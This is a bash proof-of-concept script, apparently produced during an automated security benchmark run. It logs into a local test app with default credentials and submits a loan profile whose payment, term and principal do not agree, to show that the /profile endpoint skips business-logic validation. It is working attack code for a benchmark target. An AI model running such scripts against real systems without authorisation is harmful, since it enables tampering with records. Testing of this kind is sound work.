#!/bin/bash
# POC: Demonstrates that the /profile endpoint fails to validate the mathematical relationship between loan_amount, loan_term_months, and monthly_payment. Submits a monthly payment of $9,999 for a $10,000 loan over 10 months, showing no validation exists.
# Target: ./repo
# Created: 2025-11-07T17:09:01.403Z
# Session: benchmark-XBEN-063-24-mhp3aptq

# Loan Payment Validation Bypass - Mismatched Payment Amounts POC
# This script demonstrates that the /profile endpoint accepts mathematically invalid payment scenarios

TARGET_HOST="${1:-localhost:32768}"
TARGET_URL="http://${TARGET_HOST}"

echo "[*] Loan Payment Validation Bypass POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login with default credentials to get session
echo "[*] Step 1: Authenticating with default credentials (test:test)"
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$TARGET_URL/login" \
  -d "username=test&password=test")

# Extract session cookie
SESSION_COOKIE=$(grep 'session' /tmp/cookies.txt | awk '{print $7}')
if [ -z "$SESSION_COOKIE" ]; then
    echo "[-] Failed to extract session cookie"
    exit 1
fi
echo "[+] Session cookie obtained: ${SESSION_COOKIE:0:40}..."
echo ""

# Step 2: Submit mathematically invalid payment data
echo "[*] Step 2: Submitting payment data with mathematical mismatch"
echo "[*] Scenario:"
echo "    - Principal: \$10,000"
echo "    - Term: 10 months"
echo "    - Expected monthly payment: ~\$1,000 (to break even)"
echo "    - Submitted monthly payment: \$9,999 (10x higher!)"
echo "    - Total payment would be: \$9,999 × 10 = \$99,990 (vs \$10,000 principal)"
echo ""

PROFILE_UPDATE=$(curl -s -b "session=$SESSION_COOKIE" -X POST "$TARGET_URL/profile" \
  -d "name=TestUser&lastname=Validator&email=test@validator.com&loan_amount=10000&loan_term_months=10&monthly_payment=9999" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$PROFILE_UPDATE" | tail -n1)
RESPONSE_BODY=$(echo "$PROFILE_UPDATE" | sed '$d')

echo "[*] HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
    echo "[+] Profile update ACCEPTED by server (HTTP $HTTP_CODE)"
else
    echo "[-] Profile update rejected (HTTP $HTTP_CODE)"
    exit 1
fi
echo ""

# Step 3: Verify the invalid data was stored
echo "[*] Step 3: Verifying stored values"
PROFILE_GET=$(curl -s -b "session=$SESSION_COOKIE" "$TARGET_URL/profile")

# Check if profile contains the loan parameters
if echo "$PROFILE_GET" | grep -q "10000\|9999"; then
    echo "[+] Profile retrieved successfully"
    echo ""
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "    - System accepted monthly_payment of \$9,999 for a \$10,000 principal"
    echo "    - System accepted loan_term_months of 10 months"
    echo "    - Total payments: \$9,999 × 10 = \$99,990"
    echo "    - Overpayment ratio: 9.999x (should be approximately 1.0)"
    echo ""
    echo "[!] The system failed to validate the mathematical relationship:"
    echo "    - payment * term should approximately equal principal"
    echo "    - No validation exists to prevent these mismatches"
    echo "    - This enables fraudulent loan documentation"
    echo ""
    
    # Show raw profile content for verification
    echo "[*] Raw profile snippet:"
    echo "$PROFILE_GET" | head -n 30
    
    exit 0
fi

echo "[-] Could not verify stored values - values not found in response"
exit 1